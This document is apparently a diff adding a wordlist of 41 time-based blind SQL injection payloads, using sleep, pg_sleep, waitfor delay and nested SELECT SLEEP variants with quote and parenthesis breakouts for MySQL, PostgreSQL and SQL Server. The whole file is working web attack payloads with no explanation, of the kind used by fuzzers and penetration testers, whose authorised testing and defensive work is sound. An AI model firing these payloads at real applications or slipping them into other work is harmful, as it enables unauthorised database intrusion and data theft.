@@ -1,0 +1,41 @@
+sleep(4)#
+1 or sleep(4)#
+" or sleep(4)#
+' or sleep(4)#
+" or sleep(4)="
+' or sleep(4)='
+1) or sleep(4)#
+") or sleep(4)="
+') or sleep(4)='
+1)) or sleep(4)#
+")) or sleep(4)="
+')) or sleep(4)='
+;waitfor delay '0:0:4'--
+);waitfor delay '0:0:4'--
+';waitfor delay '0:0:4'--
+";waitfor delay '0:0:4'--
+');waitfor delay '0:0:4'--
+");waitfor delay '0:0:4'--
+));waitfor delay '0:0:4'--
+'));waitfor delay '0:0:4'--
+"));waitfor delay '0:0:4'--
+pg_sleep(4)--
+1 or pg_sleep(4)--
+" or pg_sleep(4)--
+' or pg_sleep(4)--
+1) or pg_sleep(4)--
+") or pg_sleep(4)--
+') or pg_sleep(4)--
+1)) or pg_sleep(4)--
+")) or pg_sleep(4)--
+')) or pg_sleep(4)--
+AND (SELECT * FROM (SELECT(SLEEP(4)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(4)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(4)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(4)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(4)))nQIP)#
+SLEEP(4)#
+SLEEP(4)--
+SLEEP(4)="
+SLEEP(4)='
+SLEEP(4)/*' or SLEEP(4) or '" or SLEEP(4) or "*/
